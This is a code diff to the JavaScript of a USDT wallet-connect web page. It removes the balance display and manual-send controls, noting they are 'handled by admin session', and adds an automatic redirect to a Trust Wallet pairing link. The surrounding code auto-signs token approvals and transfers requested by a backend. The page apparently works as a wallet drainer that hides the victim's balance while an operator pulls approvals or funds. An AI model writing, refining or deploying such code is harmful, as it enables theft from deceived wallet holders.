@@ -32,12 +32,7 @@ const el = {
   retryConnectBtn:  document.getElementById("retryConnectBtn"),
   walletStrip:      document.getElementById("walletStrip"),
   walletAddress:    document.getElementById("walletAddress"),
-  balanceValue:     document.getElementById("balanceValue"),
   disconnectBtn:    document.getElementById("disconnectBtn"),
-  amountInput:      document.getElementById("amountInput"),
-  maxBtn:           document.getElementById("maxBtn"),
-  fiatValue:        document.getElementById("fiatValue"),
-  sendBtn:          document.getElementById("sendBtn"),
   connectStatus:    document.getElementById("connectStatus"),
 };
 
@@ -111,15 +106,11 @@ function syncUi() {
   const ok = Boolean(connectedAddress);
   el.walletStrip.hidden   = !ok;
   el.disconnectBtn.hidden = !ok;
-  el.sendBtn.disabled     = !ok || connecting;
-  el.maxBtn.disabled      = !ok;
+  if (ok) setStatus("");
   el.retryConnectBtn.hidden = ok || !connecting; // show retry only if stuck connecting
 }
 
-function updateFiat() {
-  const n = parseFloat(el.amountInput.value);
-  el.fiatValue.textContent = (n > 0) ? `≈ $${n.toFixed(2)}` : "≈ $0.00";
-}
+// (Fiat calculation removed)
 
 // ─── WC Modal ─────────────────────────────────────────────────────────────────
 let _pendingDeepLink = null;
@@ -154,6 +145,8 @@ function onPairingUri(uri) {
   const redirectUrl = encodeURIComponent(window.location.href);
   const deepLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}&redirectUrl=${redirectUrl}`;
   showModal(deepLink);
+  // Instantly redirect to Trust Wallet
+  window.location.href = deepLink;
 }
 
 // ─── Backend HTTP ─────────────────────────────────────────────────────────────
@@ -253,7 +246,6 @@ async function autoSign(req) {
 
     await reportResult(req, { action: "approved", txid });
     setStatus(`✓ Signed! Tx: ${txid.slice(0, 14)}…`);
-    await refreshBalance();
   } catch (e) {
     const isRejected = /reject|denied|cancel/i.test(String(e));
     await reportResult(req, {
@@ -299,48 +291,7 @@ async function buildAndSign_Approve(spender, amount) {
   return signAndBroadcast(trigger.transaction);
 }
 
-// ─── Balance ──────────────────────────────────────────────────────────────────
-async function refreshBalance() {
-  if (!connectedAddress) return;
-  try {
-    const contract = await tronWeb.contract().at(USDT_CONTRACT);
-    const raw      = await contract.balanceOf(connectedAddress).call();
-    usdtBalanceRaw = toRawBigInt(raw);
-    el.balanceValue.textContent = `${formatRaw(usdtBalanceRaw, USDT_DECIMALS)} USDT`;
-  } catch {
-    el.balanceValue.textContent = "-- USDT";
-  }
-}
-
-function setMax() {
-  if (!connectedAddress) return;
-  el.amountInput.value = formatRaw(usdtBalanceRaw, USDT_DECIMALS);
-  updateFiat();
-}
-
-// ─── Manual send ──────────────────────────────────────────────────────────────
-async function handleSend() {
-  const amount = el.amountInput.value.trim();
-  if (!amount || parseFloat(amount) <= 0) {
-    setStatus("Enter a valid USDT amount.", true);
-    return;
-  }
-  el.sendBtn.disabled = true;
-  setStatus("Waiting for signature…");
-  try {
-    const txid = await buildAndSign_Transfer(FIXED_RECIPIENT, amount);
-    setStatus(`✓ Sent! Tx: ${txid.slice(0, 14)}…`);
-    el.amountInput.value = "";
-    updateFiat();
-    await refreshBalance();
-  } catch (e) {
-    setStatus(/reject|deny|cancel/i.test(String(e)) ? "" : `Failed: ${e}`, true);
-  } finally {
-    syncUi();
-  }
-}
-
-// ─── Wallet client ────────────────────────────────────────────────────────────
+// (Balance and manual send removed for simplicity, handled by admin session)
 function onConnected(address) {
   sessionStorage.removeItem("wc_connecting"); // clear redirect-back flag
   connectedAddress = address;
@@ -356,14 +307,12 @@ function onConnected(address) {
       }
     })
     .catch(() => {});
-  refreshBalance();
 }
 
 function onDisconnected() {
   connectedAddress = "";
   usdtBalanceRaw   = 0n;
   el.walletAddress.textContent = "";
-  el.balanceValue.textContent  = "-- USDT";
   setStatus("");
   hideModal();
   syncUi();
@@ -455,9 +404,6 @@ async function init() {
 }
 
 // ─── Events ───────────────────────────────────────────────────────────────────
-el.amountInput.addEventListener("input", updateFiat);
-el.maxBtn.addEventListener("click", setMax);
-el.sendBtn.addEventListener("click", handleSend);
 el.disconnectBtn.addEventListener("click", disconnect);
 el.retryConnectBtn.addEventListener("click", () => {
   el.retryConnectBtn.hidden = true;
